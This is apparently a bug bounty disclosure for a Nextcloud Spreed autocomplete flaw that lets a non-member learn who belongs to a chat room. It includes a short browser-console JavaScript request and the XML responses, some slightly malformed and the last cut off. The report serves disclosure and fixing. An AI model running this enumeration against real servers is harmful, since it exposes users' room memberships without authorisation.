## Details
## Summary:
Even if you are not a member of a Spreed room, it is possible to find out who is in the room using the autocomplete API. I have not yet checked if this affects other autocomplete share types.

## Steps to reproduce:

Requirements: Three users named "demo", "demo1" and "hacker".

1. Create a new Spreed room as user "demo" (note the room ID)
2. Add user "demo1" to the room
3. Log in as user "hacker" and execute the following in the JavaScript console of your browser Change the `itemId` to the room ID you created earlier.

```
let req = new XMLHttpRequest();
req.open("GET", OC.generateUrl('/ocs/v2.php/core/autocomplete/get?search=demo&itemType=call&itemId=qqads88a&shareTypes[]=0&shareTypes[]=1&shareTypes[]=7&shareTypes[]=4'))
req.setRequestHeader('requesttoken',OC.requestToken)
req.send();
```

4. In the Network tab you will now see the following response:

```
<?xml version="1.0"?>
<ocs>
 <meta
  <status>ok</status>
  <statuscode>200</statuscode>
  <message>OK</message
 </meta>
 <data/>
</ocs>
```

5. Now as user "demo" remove user "demo1" from the chat room.
6. Re-send the request as user "hacker", you will now see that `demo1` is available as a suggestion and therefore not a member of the chat room:

```
<?xml version="1.0"?>
<ocs>
```
